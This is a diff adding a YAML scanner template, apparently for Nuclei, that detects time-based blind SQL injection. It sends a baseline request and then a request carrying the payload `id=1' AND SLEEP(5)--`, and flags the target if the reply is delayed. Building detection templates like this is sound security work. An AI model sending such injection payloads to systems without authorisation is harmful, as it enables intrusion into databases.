@@ -1,0 +1,54 @@
+# SQL Injection - Time-based blind detection
+id: sqli-time-based-blind
+name: SQL Injection (Time-Based Blind)
+description: |
+  Detects time-based blind SQL injection by comparing response times.
+  Sends a SLEEP payload and checks if response time increases significantly.
+severity: high
+author: gosleek
+tags: [sqli, injection, time-based]
+reference:
+  - https://owasp.org/www-community/attacks/SQL_Injection
+
+http:
+  # Step 1: Send normal request to get baseline timing
+  - name: baseline
+    raw: |+
+      GET / HTTP/1.1
+      Host: {{Hostname}}
+      User-Agent: Mozilla/5.0
+      Accept: */*
+      Connection: close
+
+    timeout: 30
+    redirects: false
+    matchers:
+      - type: dsl
+        dsl: ["status_code == 200"]
+
+    extractors:
+      - name: baseline
+        type: regex
+        part: header
+        group: 1
+        regex: ["Response-Time: ([0-9.]+)"]
+
+  # Step 2: Send SLEEP payload
+  - name: sleep-payload
+    raw: |+
+      GET /?id=1' AND SLEEP(5)-- HTTP/1.1
+      Host: {{Hostname}}
+      User-Agent: Mozilla/5.0
+      Accept: */*
+      Connection: close
+
+    timeout: 30
+    redirects: false
+    run-if: "{{baseline}}"
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status: [200, 500]
+      - type: time
+        time: ">=5"
